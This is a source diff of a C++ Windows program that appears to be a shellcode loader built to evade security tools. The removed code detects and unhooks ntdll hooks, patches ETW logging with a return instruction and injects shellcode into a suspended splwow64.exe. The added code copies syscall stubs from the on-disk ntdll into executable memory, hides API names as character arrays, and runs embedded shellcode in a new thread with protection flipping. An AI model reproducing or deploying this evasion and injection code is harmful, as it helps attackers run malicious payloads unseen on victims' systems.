@@ -1,29 +1,141 @@
 #include"..\public.hpp"
-#include <iostream>
-#include <Windows.h>
-#include <dbghelp.h>
-#include <psapi.h>
-#include <TlHelp32.h>
-#include <cstdlib>
-#include <winternl.h>
-#define _CRT_SECURE_NO_WARNINGS
+
+#define NtCurrentProcess()	   ((HANDLE)-1)
 
 using namespace std;
 
-BOOL isItHooked(LPVOID addr)
+typedef enum _WAIT_TYPE
 {
-	BYTE stub[] = "\x4c\x8b\xd1\xb8";
-	std::string charData = (char*)addr;
+	WaitAll = 0,
+	WaitAny = 1
+} WAIT_TYPE, * PWAIT_TYPE;
 
-	if (memcmp(addr, stub, 4) != 0)
+ULONG64 rva2ofs(PIMAGE_NT_HEADERS nt, DWORD rva)
+{
+	PIMAGE_SECTION_HEADER sh;
+	int                   i;
+
+	if (rva == 0) return -1;
+
+	sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
+
+	for (i = nt->FileHeader.NumberOfSections - 1; i >= 0; i--)
 	{
-		for (int i = 0; i < 4; i++)
+		if (sh[i].VirtualAddress <= rva && rva <= (DWORD)sh[i].VirtualAddress + sh[i].SizeOfRawData)
 		{
-			BYTE currentByte = charData[i];
+			return sh[i].PointerToRawData + rva - sh[i].VirtualAddress;
 		}
-		return TRUE;
 	}
-	return FALSE;
+	return -1;
+}
+
+LPVOID SysGetAddress(LPBYTE hModule, LPCSTR lpProcName)
+{
+	PIMAGE_DOS_HEADER       dos;
+	PIMAGE_NT_HEADERS       nt;
+	PIMAGE_DATA_DIRECTORY   dir;
+	PIMAGE_EXPORT_DIRECTORY exp;
+	DWORD                   rva, ofs, cnt;
+	PCHAR                   str;
+	PDWORD                  adr, sym;
+	PWORD                   ord;
+	if (hModule == NULL || lpProcName == NULL) return NULL;
+	dos = (PIMAGE_DOS_HEADER)hModule;
+	nt = (PIMAGE_NT_HEADERS)(hModule + dos->e_lfanew);
+	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
+	// no exports? exit
+	rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+	if (rva == 0) return NULL;
+	ofs = rva2ofs(nt, rva);
+	if (ofs == -1) return NULL;
+	// no exported symbols? exit
+	exp = (PIMAGE_EXPORT_DIRECTORY)(ofs + hModule);
+	cnt = exp->NumberOfNames;
+	if (cnt == 0) return NULL;
+	// read the array containing address of api names
+	ofs = rva2ofs(nt, exp->AddressOfNames);
+	if (ofs == -1) return NULL;
+	sym = (PDWORD)(ofs + hModule);
+	// read the array containing address of api
+	ofs = rva2ofs(nt, exp->AddressOfFunctions);
+	if (ofs == -1) return NULL;
+	adr = (PDWORD)(ofs + hModule);
+	// read the array containing list of ordinals
+	ofs = rva2ofs(nt, exp->AddressOfNameOrdinals);
+	if (ofs == -1) return NULL;
+	ord = (PWORD)(ofs + hModule);
+	// scan symbol array for api string
+	do {
+		str = (PCHAR)(rva2ofs(nt, sym[cnt - 1]) + hModule);
+		// found it?
+		if (strcmp(str, lpProcName) == 0) {
+			// return the address
+			return (LPVOID)(rva2ofs(nt, adr[ord[cnt - 1]]) + hModule);
+		}
+	} while (--cnt);
+	return NULL;
+}
+
+LPVOID GetSysStub(LPCSTR lpSyscallName)
+{
+	HANDLE                        file = NULL, map = NULL;
+	LPBYTE                        mem = NULL;
+	LPVOID                        cs = NULL;
+	PIMAGE_DOS_HEADER             dos;
+	PIMAGE_NT_HEADERS             nt;
+	PIMAGE_DATA_DIRECTORY         dir;
+	PIMAGE_RUNTIME_FUNCTION_ENTRY rf;
+	ULONG64                       ofs, start = 0, end = 0, addr;
+	SIZE_T                        len;
+	DWORD                         i, rva;
+
+	char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
+	// open file
+	file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (file == INVALID_HANDLE_VALUE) { goto cleanup; }
+	// create mapping
+	map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
+	if (map == NULL) { goto cleanup; }
+	// create view
+	mem = (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
+	if (mem == NULL) { goto cleanup; }
+	// try resolve address of system call
+	addr = (ULONG64)SysGetAddress(mem, lpSyscallName);
+	if (addr == 0) { goto cleanup; }
+	dos = (PIMAGE_DOS_HEADER)mem;
+	nt = (PIMAGE_NT_HEADERS)((PBYTE)mem + dos->e_lfanew);
+	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
+	// no exception directory? exit
+	rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
+	if (rva == 0) { goto cleanup; }
+	ofs = rva2ofs(nt, rva);
+	if (ofs == -1) { goto cleanup; }
+	rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem);
+	// for each runtime function (there might be a better way??)
+	for (i = 0; rf[i].BeginAddress != 0; i++) {
+		// is it our system call?
+		start = rva2ofs(nt, rf[i].BeginAddress) + (ULONG64)mem;
+		if (start == addr) {
+			// save the end and calculate length
+			end = rva2ofs(nt, rf[i].EndAddress) + (ULONG64)mem;
+			len = (SIZE_T)(end - start);
+			// allocate RWX memory
+			cs = VirtualAlloc(NULL, len,
+				MEM_COMMIT | MEM_RESERVE,
+				PAGE_EXECUTE_READWRITE);
+			if (cs != NULL) {
+				// copy system call code stub to memory
+				CopyMemory(cs, (const void*)start, len);
+			}
+			break;
+		}
+	}
+cleanup:
+	if (mem != NULL) UnmapViewOfFile(mem);
+	if (map != NULL) CloseHandle(map);
+	if (file != NULL) CloseHandle(file);
+	// return pointer to code stub or NULL
+	return cs;
 }
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
@@ -36,115 +148,45 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 		return 0;
 	}
 
-	int nbHooks = 0;
-	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory")))
-	{
-		nbHooks++;
-	}
-	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory")))
-	{
-		nbHooks++;
-	}
-	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")))
-	{
-		nbHooks++;
-	}
-	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory")))
-	{
-		nbHooks++;
-	}
-
-	if (nbHooks > 0)
-	{
-		char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
-		char sntdll[] = { '.','t','e','x','t',0 };
-		HANDLE process = GetCurrentProcess();
-		MODULEINFO mi = {};
-		HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
-		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
-		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
-		HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-		HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-		LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
-		PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
-		PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
-		for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
-		{
-			PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
-			if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll))
-			{
-				DWORD oldProtection = 0;
-				bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
-				memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
-				isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
-			}
-		}
-
-		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory")))
-		{
-			nbHooks++;
-		}
-
-		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory")))
-		{
-			nbHooks++;
-		}
-		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")))
-		{
-			nbHooks++;
-		}
-		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory")))
-		{
-			nbHooks++;
-		}
-	}
 
 	// Redefine Nt functions
-	typedef LPVOID(NTAPI* uNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-	typedef NTSTATUS(NTAPI* uNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
-	typedef NTSTATUS(NTAPI* uNtCreateThreadEx) (OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);
-	typedef NTSTATUS(NTAPI* uNtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
-	typedef NTSTATUS(NTAPI* uNtResumeThread)(HANDLE ThreadHandle, PULONG SuspendCount);
+	typedef NTSTATUS(NTAPI* pNtAVM)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+	unsigned char sNtAVM[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0x0 };
+	pNtAVM fnNtAVM = (pNtAVM)GetSysStub((LPCSTR)sNtAVM);
 
-	HINSTANCE hNtdll = GetModuleHandleA("ntdll.dll");
-	uNtAllocateVirtualMemory pNtAllocateVirtualMemory = (uNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-	uNtWriteVirtualMemory pNtWriteVirtualMemory = (uNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-	uNtProtectVirtualMemory pNtProtectVirtualMemory = (uNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-	uNtCreateThreadEx pNtCreateThreadEx = (uNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
-	uNtResumeThread pNtResumeThread = (uNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
+	typedef NTSTATUS(NTAPI* pNtPVM)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
+	unsigned char sNtPVM[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0x0 };
+	pNtPVM fnNtPVM = (pNtPVM)GetSysStub((LPCSTR)sNtPVM);
 
-	//Patch ETW
-	void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
-	unsigned char etwPatch[] = { 0xC3 };
-	DWORD lpflOldProtect = 0;
-	unsigned __int64 memPage = 0x1000;
-	void* etwAddr_bk = etwAddr;
-	pNtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
-	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (PULONG)nullptr);
-	pNtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+	typedef void(WINAPI* pRMM)(void*, const void*, SIZE_T);
+	unsigned char sRMM[] = { 'R','t','l','M','o','v','e','M','e','m','o','r','y',0x0 };
+	pRMM fnRMM = (pRMM)GetSysStub((LPCSTR)sRMM);
 
-	STARTUPINFOEXA si;
-	PROCESS_INFORMATION pi;
-	SIZE_T attributeSize;
-	memset(&si, 0, sizeof(STARTUPINFOEXA));
-	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-	CreateProcessA(0, (LPSTR)"C:\\Windows\\splwow64.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si.StartupInfo, &pi);
+	typedef NTSTATUS(NTAPI* pNtCTF)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
+	unsigned char sNtCTF[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0 };
+	pNtCTF fnCTF = (pNtCTF)GetSysStub((LPCSTR)sNtCTF);
 
+	typedef NTSTATUS(NTAPI* pNtWFMO)(ULONG Count, PHANDLE Handles, WAIT_TYPE WaitType, BOOLEAN Alertable, PLARGE_INTEGER Timeout OPTIONAL);
+	unsigned char sWFMO[] = { 'N','t','W','a','i','t','F','o','r','M','u','l','t','i','p','l','e','O','b','j','e','c','t','s', 0 };
+	pNtWFMO fnNtWFMO = (pNtWFMO)GetSysStub((LPCSTR)sWFMO);
+
+	typedef NTSTATUS(NTAPI* pNtFVM)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
+	unsigned char sNtFVM[] = { 'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y' };
+	pNtFVM fnNtFVM = (pNtFVM)GetSysStub((LPCSTR)sNtFVM);
+
+	PVOID BaseAddress = NULL;
 	SIZE_T dwSize = shellcodeSize;
-	PVOID NTAlloc = NULL;
-	pNtAllocateVirtualMemory(pi.hProcess, &NTAlloc, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	fnNtAVM(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	ULONG bytesWritten = 0;
-	pNtWriteVirtualMemory(pi.hProcess, NTAlloc, shellcode, shellcodeSize, &bytesWritten);
+	fnRMM(BaseAddress, shellcode, shellcodeSize);
 
+	HANDLE hThread;
 	DWORD OldProtect = 0;
-	pNtProtectVirtualMemory(pi.hProcess, &NTAlloc, (PSIZE_T)&shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
+	fnNtPVM(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_NOACCESS, &OldProtect);
 
-	HANDLE remoteThreadHandle;
-	pNtCreateThreadEx(&remoteThreadHandle, 0x1FFFFF, NULL, pi.hProcess, NTAlloc, NULL, FALSE, NULL, NULL, NULL, NULL);
-
-	ULONG suspendCount = 0;
-	pNtResumeThread(pi.hThread, &suspendCount);
-	
-    return 0;
+	HANDLE hHostThread = INVALID_HANDLE_VALUE;
+	fnCTF(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+	fnNtPVM(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE, &OldProtect);
+	fnNtWFMO(1, &hHostThread, WaitAll, FALSE, NULL);
+	fnNtFVM((HANDLE)-1, &BaseAddress, &dwSize, MEM_RELEASE);
 }
